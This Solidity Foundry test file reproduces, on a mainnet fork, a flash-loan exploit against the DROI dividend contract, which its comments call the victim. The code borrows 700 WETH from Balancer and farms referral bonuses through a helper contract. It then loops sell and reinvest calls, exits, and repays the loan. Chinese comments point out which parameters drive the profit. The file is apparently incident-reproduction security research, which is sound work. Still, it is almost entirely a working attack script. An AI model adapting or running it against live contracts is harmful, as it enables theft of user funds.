// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

interface IWETH {
    function deposit() external payable;
    function withdraw(uint amount) external;
    function approve(address spender, uint amount) external returns (bool);
    function balanceOf(address) external view returns (uint);
    function transfer(address to, uint amount) external returns (bool);
}

interface IDROI {
    function buy(address referredBy) external payable;
    function sell(uint256 amountOfTokens) external;
    function reinvest() external;
    function exit() external;
    function balanceOf(address customerAddress) external view returns (uint256);
    function transfer(address to, uint256 amountOfTokens) external returns (bool);
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] calldata tokens,
        uint256[] calldata amounts,
        bytes calldata userData
    ) external;
}

contract HelperB {
    mapping(address => bool) public _sendBack;
    address public receiver;
    address public droi;

    constructor(address _receiver, address _droi) {
        receiver = _receiver;
        droi = _droi;
        _sendBack[_receiver] = true;
    }

    // 与链上“未知选择器 0x20e42ac3”对齐：用 fallback 识别并触发 DROI.exit()，
    // 重要：低级 call，失败不冒泡，避免整笔回滚
    fallback() external payable {
        if (msg.sig == bytes4(0x20e42ac3)) { //   exit()
            (bool ok, ) = address(droi).call(abi.encodeWithSignature("exit()"));
            ok; // ignore
        }
    }

    function sendBack() external {
        require(_sendBack[msg.sender], "Not authorized");
        (bool success, ) = receiver.call{value: address(this).balance}("");
        require(success, "Send back failed");
    }

    receive() external payable {}
}

/* ========= 会被 etch 到 OWNER 上的实现（EIP-7702 模拟） ========= */
contract AttackerImpl {
    address public OWNER;
    address public WETH;
    address public VAULT;
    address public DROI;
    HelperB public helper;

    modifier onlyOwnerEOA() {
        require(tx.origin == OWNER, "origin!=OWNER");
        _;
    }

    function init(address _owner, address _weth, address _vault, address _droi) external {
        if (OWNER == address(0)) {
            OWNER = _owner;
            WETH  = _weth;
            VAULT = _vault;
            DROI  = _droi;
        }
    }

    function startExploit() external onlyOwnerEOA {
        address[] memory tokens = new address[](1);
        tokens[0] = WETH;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 700 ether;    //可以给自己模拟钱多一点就走自己的了,这个就不影响了

        IBalancerVault(VAULT).flashLoan(
            address(this), // recipient = OWNER 地址（现在有代码）
            tokens,
            amounts,
            ""
        );
    }

    /* ====== Balancer 回调 ====== */
    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory /* userData */
    ) external onlyOwnerEOA {
        require(msg.sender == VAULT, "Not Vault");
        require(tokens.length == 1 && tokens[0] == WETH, "Unexpected token");

        IWETH weth = IWETH(WETH);
        IDROI droi = IDROI(DROI);

        // 1) WETH -> ETH
        weth.withdraw(amounts[0]);

        // 2) 部署 HelperB（receiver = OWNER，droi = DROI）
        helper = new HelperB(OWNER, DROI);

        // 3) buy 1 ETH（referrer = helper）
        droi.buy{value: 1 ether}(address(helper));    //hello 有影响:"为攻击者合约绑定推荐人 helper，并产生最初的代币持仓"

        // 4) 把已有的 DROI 转给 helper（若有）
        uint256 bal = droi.balanceOf(address(this));
        if (bal > 0) {
            droi.transfer(address(helper),  50 ether);    //hellox 有影响  这个50是合约里写了，一定要达到50才能有推荐奖励。这个不设计进去计算
        }

        // 5) 10 次，每次 5 ETH 的 buy
        for (uint i = 0; i < 10; i++) {
            droi.buy{value: 5 ether}(address(helper));  //hello 有影响: "重复多次买入操作，让推荐人（helper）不断获得推荐奖励（referral bonus），从而积累大量可提现的 ETH 分红"
        }

        // 6) 大额 buy（近似反编译值 610.73 ETH），保留还款缓冲
        uint256 fee = (feeAmounts.length > 0) ? feeAmounts[0] : 0;
        uint256 repay = amounts[0] + fee;
        uint256 repayBuffer = repay + 0.0001 ether;          //这4行闪电贷的 不用管
        uint256 ethBal = address(this).balance;
        droi.buy{value: 0x211b94d336ba510000}(address(helper));
        //droi.buy{value: 610.73 ether}(address(helper));   //hello 有影响,和最后一笔大额buy有影响

        // 7) 100 次：卖 10% + reinvest
        for (uint i = 0; i < 100; i++) {    //hello 有影响  和i的循环次数有影响
            uint256 amt = droi.balanceOf(address(this));
            if (amt == 0) break;
            //uint256 tenPct = (amt * 10) / 100;
            uint256 tenPct = amt / 10;  //hello 有影响   和10有影响
            if (tenPct == 0) break;
            droi.sell(tenPct);
            droi.reinvest();
        }

        // 8) 先在 OWNER 本体上 exit（对齐链上顺序）
        droi.exit();

        // 9) 按链上做法：对 helper 调“0x20e42ac3”，用低级 call，失败不回滚
        address(helper).call(abi.encodeWithSelector(bytes4(0x20e42ac3)));

        // 10) helper sendBack（把它持有的 ETH 回 OWNER）
        helper.sendBack();

        // 11) 归还闪电贷：把 ETH 变回 WETH，然后直接 transfer（NOT approve）
        uint256 need = repay;
        uint256 curEth = address(this).balance;
        if (curEth > 0) {
            uint256 toDeposit = curEth >= need ? need : curEth;
            weth.deposit{value: toDeposit}();
        }

        uint256 wethBal = weth.balanceOf(address(this));
        // 为了测试稳定，把 OWNER 预充值很多 ETH，确保即使策略亏损也能回笼足额
        require(wethBal >= need, "insufficient WETH to repay");
        require(IWETH(WETH).transfer(VAULT, need), "transfer back failed");
    }

    receive() external payable {}
}

interface IAttackerOnEOA {
    function init(address _owner, address _weth, address _vault, address _droi) external;
    function startExploit() external;
}


contract ExploitDROITest is Test {
    address constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;  //提供闪电贷的
    address constant WETH_ADDR      = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant DROI_ADDR      = 0x4e9B6e88e6B83453e3ec6a1fFA0c95f289cF81d5;   //受害者合约
    //address constant DROI_ADDR = 0x4e9B6e88e6B83453e3ec6a1fFA0c95f289cF81d5;      //hello 变量

    // 反编译里硬编码的 owner（也是 7702 的“带码 EOA”）
    //address constant OWNER   = 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496;  //DailyRoi
    address public OWNER;

    function setUp() public {
        vm.createSelectFork("",22_918_648);
        OWNER = vm.addr(1300000);
        // 满足合约里对 owner 余额的检查，并给足安全垫
        //hello  有影响 这个直接固定一个很大的值,就不需要考虑闪电贷了
         vm.deal(OWNER, 5 ether);
    }
using stdJson for string;

function _eth(address a) internal view returns (uint256) {
    return a.balance;
}

function _weth(address a) internal view returns (uint256) {
    return IWETH(WETH_ADDR).balanceOf(a);
}

function _total(address a) internal view returns (uint256) {
    return _eth(a) + _weth(a); // 1 WETH 视为 1 ETH
}

function _safeToInt(uint256 x) internal pure returns (int256) {       //修改
    require(x <= uint256(type(int256).max), "value too large to convert to int256");
    return int256(x);
}

function testExploit_UsingEIP7702Etch() public {
    // 预留：记录起始资产
    uint256 eth0  = _eth(OWNER);
    uint256 weth0 = _weth(OWNER);
    uint256 tot0  = _total(OWNER);

    // 1) 部署实现并 etch 到 OWNER（EIP-7702 模拟）
    AttackerImpl impl = new AttackerImpl();
    bytes memory runtime = address(impl).code;
    require(runtime.length > 0, "no runtime");
    vm.etch(OWNER, runtime);


    // 2) 以 OWNER 身份执行
    vm.startPrank(OWNER, OWNER);
    IAttackerOnEOA(OWNER).init(OWNER, WETH_ADDR, BALANCER_VAULT, DROI_ADDR);
    IAttackerOnEOA(OWNER).startExploit();
    vm.stopPrank();

    // 结束：记录收尾资产
    uint256 eth1  = _eth(OWNER);
    uint256 weth1 = _weth(OWNER);
    uint256 tot1  = _total(OWNER);

    // 打印结果（Foundry 控制台）
    // console.log("OWNER before  ETH :", eth0);
    // console.log("OWNER before WETH :", weth0);
    // console.log("OWNER before TOT  :", tot0);
    // console.log("-----------------------------");
    // console.log("OWNER after   ETH :", eth1);
    // console.log("OWNER after  WETH :", weth1);
    // console.log("OWNER after  TOT  :", tot1);
    // console.log("-----------------------------");
    // console.log(" ETH :", eth1  >= eth0  ? eth1-eth0  : 0);
    // console.log(" WETH:", weth1 >= weth0 ? weth1-weth0 : 0);
    //console.log(" TOT :", tot1  >= tot0  ? tot1-tot0  : 0);
    //console.log("TOT:", tot1 - tot0);
    //int256 ethDiff  = _safeToInt(eth1)  - _safeToInt(eth0);
    //int256 wethDiff = _safeToInt(weth1) - _safeToInt(weth0);
    int256 totDiff  = _safeToInt(tot1)  - _safeToInt(tot0);

    //console.logInt(ethDiff);
    //console.logInt(wethDiff);
    console.logInt(totDiff);

    // 也可以直接断言是否盈利（按需开启）
    // assertGt(tot1, tot0, "No profit");
}

}